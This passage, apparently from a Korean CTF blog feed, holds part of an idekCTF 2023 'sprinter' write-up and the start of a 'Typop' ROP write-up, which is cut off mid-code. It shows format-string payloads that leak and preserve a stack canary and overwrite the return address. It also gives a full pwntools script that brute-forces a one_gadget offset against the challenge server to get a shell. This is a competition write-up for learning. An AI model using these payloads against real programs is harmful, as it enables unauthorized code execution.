python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%10$264c&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p8(<span class="number">0x41</span>)   <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p>Ìïú Î∏îÎ°ùÏùÄ 8Î∞îÏù¥Ìä∏Ïù¥Í∏∞ ÎïåÎ¨∏Ïóê Ìå®Îî©ÏùÑ Ï†ÄÎ†áÍ≤å Ï§òÏïºÌïúÎã§. Í∞ÄÎèÖÏÑ±ÏùÑ ÏúÑÌï¥ Îëê Î≤à ÎÇòÎàÑÏñ¥ÏÑú ÏûëÏÑ±ÌñàÎäîÎç∞, 0x26Ïùò ÏùòÎØ∏Îäî Î¨∏Ï†úÏóêÏÑú ÏöîÍµ¨Ìïú Í∏∏Ïù¥ Ï†úÌïúÏù¥Îã§.</p><p>payloadÎ•º Ï†ÄÎ†áÍ≤å ÏûëÏÑ±ÌïòÍ≤å ÎêòÎ©¥ 10Î≤àÏß∏ offsetÏùÑ Ï∞∏Í≥†ÌïòÏó¨ 264Î≤àÏùò Í≥µÎ∞± Ï∂úÎ†• ÌõÑ ÎßàÏßÄÎßâÏóê 0x41ÏùÑ Ï∂úÎ†•ÌïúÎã§. gdb ÏÉÅÏóêÏÑú ÌôïÏù∏Ìï¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><ul><li><code>FSB</code> ÏùºÏúºÌÇ§Í∏∞ Ï†Ñ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffc4a31cb80‚îÇ+0x0000: &quot;%10$264c&quot;     ‚Üê $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffc4a31cb88‚îÇ+0x0008: 0x0000000000000000        # 6</span><br><span class="line">0x007ffc4a31cb90‚îÇ+0x0010: 0x0000000000000000        # 7</span><br><span class="line">0x007ffc4a31cb98‚îÇ+0x0018: 0x0000000000000000        # 8</span><br><span class="line">0x007ffc4a31cba0‚îÇ+0x0020: 0x0000000000000000        # 9</span><br><span class="line">0x007ffc4a31cba8‚îÇ+0x0028: 0x00034000000a41 (&quot;A\n&quot;?) # 10</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li><code>FSB</code> ÏùºÏúºÌÇ® ÌõÑ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc4a31cb80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cb90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cba0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbb0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbe0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc80: 0x4120202020202020      0x5207f53f7a984d00</span><br><span class="line">0x7ffc4a31cc90: 0x00007ffc4a31cca0      0x00000000004012fd</span><br></pre></td></tr></table></figure><p>Î≥∏Í≤©Ï†ÅÏúºÎ°ú <code>canary</code> Î≥¥Ï°¥ÏùÑ ÏãúÏûëÌï¥Î≥¥Ïûê. <code>ret</code>Î•º ÎçÆÍ∏∞ ÏúÑÌï¥ÏÑúÎäî ÌïÑÏàòÏ†ÅÏúºÎ°ú <code>canary</code>Î•º Í±¥ÎìúÎ†§ÏïºÎßå ÌïúÎã§. Ïö∞Î¶¨Îäî <code>FSB</code>Î•º Ïù¥Ïö©ÌïòÏó¨ <code>canary</code>Î•º Íµ¨Ìïú Îã§ÏùåÏóê Ïç®Ïïº ÌïúÎã§. Ï¶â, ÏïûÏóêÏÑú ÎßêÌïú <code>canary</code> Î≥¥Ï°¥ÏùÄ <code>canary</code>Î•º leakÌïú Îã§Ïùå Í∑∏ ÏûêÎ¶¨Ïóê Îã§Ïãú Ïç®ÏïºÌïòÎäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%5$264c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>   <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)     <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p><code>5Î≤àÏß∏</code> Ïò§ÌîÑÏÖãÏùÄ <code>0x25</code>Î•º ÏùòÎØ∏ÌïòÍ≥† <code>4Î≤àÏß∏</code> Ïò§ÌîÑÏÖãÏùÄ <code>r9</code> Î†àÏßÄÏä§ÌÑ∞Ïù∏ <code>0x00</code>Ïù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2563343632243525</span><br></pre></td></tr></table></figure><p><code>10Î≤àÏß∏</code> Ïò§ÌîÑÏÖãÏùÄ <code>canary_addr + 1</code>ÏùÑ ÏùòÎØ∏ÌïòÎäîÎç∞ <code>+1</code>Ïùò ÏùòÎØ∏Îäî <code>canary</code>Îäî <code>null</code> Î∞îÏù¥Ìä∏Î∂ÄÌÑ∞ ÏãúÏûëÌïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. Í∑∏ÎûòÏÑú <code>canary_addr + 1</code>Î∂ÄÌÑ∞ <code>%.7s</code>Î•º Ïù¥Ïö©ÌïòÏó¨ 7ÏûêÎ¶¨Îßå Í∞ÄÏ†∏ÏôîÎã§. ÏïûÏóêÏÑú <code>%4$c</code>ÏúºÎ°ú <code>null</code> Î∞îÏù¥Ìä∏ Ìïú Î∞îÏù¥Ìä∏Îßå Í∞ÄÏ†∏ÏôîÍ∏∞ ÎïåÎ¨∏Ïóê <code>canary</code>Í∞Ä Ïûò Î≥¥Ï°¥ÎêòÏóàÏúºÎ¶¨Îùº ÏÉùÍ∞ÅÎêúÎã§. </p><p><code>%s</code>Î•º Ïù¥Ïö©ÌïòÏó¨ Ïπ¥ÎÇòÎ¶¨Î•º Ï†ÑÎ∂Ä Îã§ Í∞ÄÏ†∏Ïò§Í≤å ÎêòÎ©¥ <code>null</code>¬†Î∞îÏù¥Ìä∏ ÎïåÎ¨∏Ïóê <code>sprint</code> Ìï®ÏàòÎ°ú <code>canary</code> Ï∂úÎ†•ÏùÑ ÌïòÎã§Í∞Ä ÎÅäÍ∏¥Îã§. ÏÇ¨Ïã§ÏÉÅ Ï≤´ Î∞îÏù¥Ìä∏Í∞Ä <code>null</code>Ïù¥Í∏∞ ÎïåÎ¨∏Ïóê Ï†ÑÌòÄ Ï∂úÎ†•ÏùÑ ÌïòÏßÄ Î™ªÌïúÎã§. Í∑∏ÎûòÏÑú ÏúÑÏôÄ Í∞ôÏùÄ Î∞©Î≤ïÏúºÎ°ú Ï∂úÎ†•ÏùÑ Ìï¥ÏïºÌïúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402300: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402310: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402320: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402330: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402340: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402350: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402360: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402370: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402380: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402390: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023a0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023b0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023c0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023d0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023e0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023f0: 0x2520202020202020      0x92c29f2c0e8fb100</span><br><span class="line">0x7fff9a402400: 0x00007fff9a402400      0x00000000004012fd</span><br></pre></td></tr></table></figure><p><code>canary</code> Î≥¥Ï°¥Ïóê ÏÑ±Í≥µÌñàÏúºÎ©¥ <code>rbp</code>Î•º ÎçÆÍ≥† <code>ret</code>Î•º ÏõêÌïòÎäî Í≥≥ÏúºÎ°ú ÎèåÎ†§Ï£ºÎ©¥ ÎÅùÏù¥Îã§.</p><h3 id="2-retÎ•º-ÎçÆÏñ¥-ÌùêÎ¶Ñ-Î≥ÄÍ≤ΩÌïòÍ∏∞"><a href="#2-retÎ•º-ÎçÆÏñ¥-ÌùêÎ¶Ñ-Î≥ÄÍ≤ΩÌïòÍ∏∞" class="headerlink" title="2. retÎ•º ÎçÆÏñ¥ ÌùêÎ¶Ñ Î≥ÄÍ≤ΩÌïòÍ∏∞"></a>2. <code>ret</code>Î•º ÎçÆÏñ¥ ÌùêÎ¶Ñ Î≥ÄÍ≤ΩÌïòÍ∏∞</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;AAA%5$261c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>  <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rbp</span></span><br><span class="line">payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line"><span class="comment"># ret</span></span><br><span class="line">payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)        <span class="comment"># 10 canary</span></span><br><span class="line">payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)  <span class="comment"># 11 libc</span></span><br><span class="line">payload += p64(stack_leak)             <span class="comment"># 12 stack</span></span><br></pre></td></tr></table></figure><p><code>sprintf(buf, buf);</code>ÏúºÎ°ú <code>FSB</code>Í∞Ä Ìä∏Î¶¨Í±∞ Îê† Îïå ÏùµÏä§ÌïòÎäî Í≤ÉÏóêÏÑú Í∞ÄÏû• ÍπåÎã§Î°úÏö¥ Ï†êÏùÄ ÌéòÏù¥Î°úÎìúÎ•º Ï†ÅÏñ¥ÎÜìÏùÄ <code>buf</code>Í∞Ä Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏóê ÏùòÌï¥ ÎçÆÌûê Í∞ÄÎä•ÏÑ±Ïù¥ Ï°¥Ïû¨ÌïúÎã§Îäî Í≤ÉÏù¥Îã§. Í∑∏ÎûòÏÑú Ïö∞Î¶¨Îäî Ïã§ÌñâÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜåÎ•º ÌéòÏù¥Î°úÎìú Ï†úÏùº ÏïûÏóê Ï†ÅÏñ¥Ï£ºÏñ¥ ÎçÆÌûàÏßÄ ÏïäÍ≤å Ìï¥Ïïº ÌïúÎã§. </p><p><code>ret</code> Î∂ÄÎ∂ÑÏùò Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏùÑ Ìï¥ÏÑùÌï¥Î≥¥Î©¥ 12Î≤àÏß∏ Ïò§ÌîÑÏÖãÏóêÏÑú 3Î∞îÏù¥Ìä∏Î•º Í∞ÄÏ†∏Ïò§Í≥† 11Î≤àÏß∏ Ïò§ÌîÑÏÖãÏóêÏÑú 5Î∞îÏù¥Ìä∏Î•º Í∞ÄÏ†∏Ïò§Îäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§. 12Î≤àÏß∏ Ïò§ÌîÑÏÖãÏóêÎäî Ïä§ÌÉù Ï£ºÏÜåÍ∞Ä Ï†ÅÌòÄÏ†∏ ÏûàÏúºÎ©∞ ÌéòÏù¥Î°úÎìú Ï≤´ Î∂ÄÎ∂Ñ 3Î∞îÏù¥Ìä∏Î•º Í∞ÄÏ†∏Ïò§Îäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§. 11Î≤àÏß∏ Ïò§ÌîÑÏÖãÏùÄ libc Ï£ºÏÜåÍ∞Ä Ï†ÄÏû•ÎêòÏñ¥ ÏûàÎäîÎç∞ Ï†ïÌôïÌïú Í∞íÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f 78 55 18 d0 83</span><br></pre></td></tr></table></figure><p><code>aslr</code> ÎïåÎ¨∏Ïóê ÌïòÏúÑ 1.5Î∞îÏù¥Ìä∏Î•º Ï†úÏô∏ÌïòÍ≥† Í≥ÑÏÜç Î≥ÄÍ≤ΩÎêúÎã§. Ïö∞Î¶¨Í∞Ä ÏÇ¨Ïö©Ìï† <code>one gadget</code> offsetÏùÄ 3Î∞îÏù¥Ìä∏Ïù¥ÎØÄÎ°ú 5Î∞îÏù¥Ìä∏Îßå Ï†ïÌôïÌïú Í∞íÏùÑ Ïì∞Í≥† ÎÇòÎ®∏ÏßÄ 3Î∞îÏù¥Ìä∏Î•º <code>one gadget</code> offsetÏùÑ ÏÇ¨Ïö©ÌïúÎã§. Î¨ºÎ°† Ïù¥ Í∞íÏùÄ ÌéòÏù¥Î°úÎìú Í∞ÄÏû• Ï≤´ Î∂ÄÎ∂ÑÏóê Ï†ÅÌòÄ ÏûàÏñ¥Ïïº ÌïúÎã§. ÏùºÎã® Ïù¥ Î∂ÄÎ∂ÑÏùÄ <code>AAA</code>Î°ú Í∞íÏùÑ Ï†ÅÏñ¥ÎÜìÍ≥† 3 Í∏ÄÏûê ÏçºÍ∏∞ ÎïåÎ¨∏Ïóê <code>%264c</code>Î•º <code>%261c</code>Î°ú Î≥ÄÍ≤ΩÌïòÏòÄÎã§. </p><p>Ïù¥Ï†ú gdb ÏÉÅÏúºÎ°ú Î©îÎ™®Î¶¨Î•º ÏÇ¥Ìé¥Î≥¥Ïûê.</p><ul><li><code>FSB</code> ÏùºÏúºÌÇ§Í∏∞ Ï†Ñ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffd1f0d4bb0‚îÇ+0x0000: &quot;AAA%5$261c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;       ‚Üê $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffd1f0d4bb8‚îÇ+0x0008: &quot;1c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc0‚îÇ+0x0010: &quot;0$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc8‚îÇ+0x0018: &quot;%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bd0‚îÇ+0x0020: 0x0073352e243131 (&quot;11$.5s&quot;?)</span><br><span class="line">0x007ffd1f0d4bd8‚îÇ+0x0028: 0x007ffd1f0d4cb9  ‚Üí  0xd0edc89128c0bcb7</span><br><span class="line">0x007ffd1f0d4be0‚îÇ+0x0030: 0x007ffd1f0d4cdb  ‚Üí  0x00001800007f7855</span><br></pre></td></tr></table></figure><ul><li><code>FSB</code> ÏùºÏúºÌÇ® ÌõÑ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x7ffd1f0d4bb0: 0x2020202020414141      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4be0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4ca0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4cb0: 0x4120202020202020      0xedc89128c0bcb700</span><br><span class="line">0x7ffd1f0d4cc0: 0xb020202020202020      0x00007f7855414141</span><br><span class="line">0x7ffd1f0d4cd0: 0x0000000000000000      0x00007f785518d083</span><br></pre></td></tr></table></figure><p><code>ret</code>Í∞Ä <code>0x00007f7855414141</code>Î°ú Ïûò Î≥ÄÏ°∞ ÎêòÏóàÎã§.</p><img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 20.44.01.png" width=450/><br><p>Ïù¥Ï†ú <code>one gadget</code>ÏùÑ Ïù¥Ïö©ÌïòÏó¨ exploitÏùÑ ÏßÑÌñâÌï¥Î≥¥Ïûê.</p><h3 id="3-offset-Brute-forcing"><a href="#3-offset-Brute-forcing" class="headerlink" title="3. offset Brute forcing"></a>3. offset Brute forcing</h3><p>ÏÇ¨Ïö©Ìï† <code>one gadget</code> Ïò§ÌîÑÏÖãÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><p><code>\x01\x3b\x0e</code> Î•º ÏÇ¨Ïö©Ìï† Í≤ÉÏù∏Îç∞ ÌïòÏúÑ 1.5Î∞îÏù¥Ìä∏ ÎßêÍ≥†Îäî <code>aslr</code> ÎïåÎ¨∏Ïóê Ïò§ÌîÑÏÖãÏù¥ ÎûúÎç§Ïù¥ÎãàÍπå 1&#x2F;4096Ïùò ÌôïÎ•†Ïùò Î∏åÎ£®Ìä∏Ìè¨Ïã±Ïù¥ ÌïÑÏöîÌïòÎã§.</p><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&#x27;vuln&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;sprinter.chal.idek.team&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        stack_leak = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;stack_leak : <span class="subst">&#123;<span class="built_in">hex</span>(stack_leak)&#125;</span>&#x27;</span>)</span><br><span class="line">        canary_addr = stack_leak + <span class="number">0x108</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;\x01\xfb\xff%5$261c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%4$c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># rbp</span></span><br><span class="line">        payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line">        payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># padding</span></span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">        payload += p64(canary_addr + <span class="number">1</span>)         <span class="comment"># 10</span></span><br><span class="line">        payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)   <span class="comment"># 11</span></span><br><span class="line">        payload += p64(stack_leak)              <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(</span><br><span class="line">            p.recvn(<span class="number">100</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        ))</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(ex)</span><br></pre></td></tr></table></figure><br><img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 00.29.59.png" width=500/>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Typop (rop)</title>
      <link href="/230116-idekctf2023-typop/"/>
      <url>/230116-idekctf2023-typop/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><blockquote><p>While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?<br><code>nc typop.chal.idek.team 1337</code></p></blockquote><ul><li>[155 solves &#x2F; 408 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>mitigationÏùÄ ÏúÑÏôÄ Í∞ôÍ≥†, ÌîÑÎ°úÍ∑∏Îû® Íµ¨Ï°∞Îäî <code>main</code> Ìï®ÏàòÏóêÏÑú whileÎ°ú <code>getFeedback</code> Ìï®ÏàòÎ•º Í≥ÑÏÜç Ìò∏Ï∂úÌïòÎäî Íµ¨Ï°∞Ïù¥Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getFeedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = 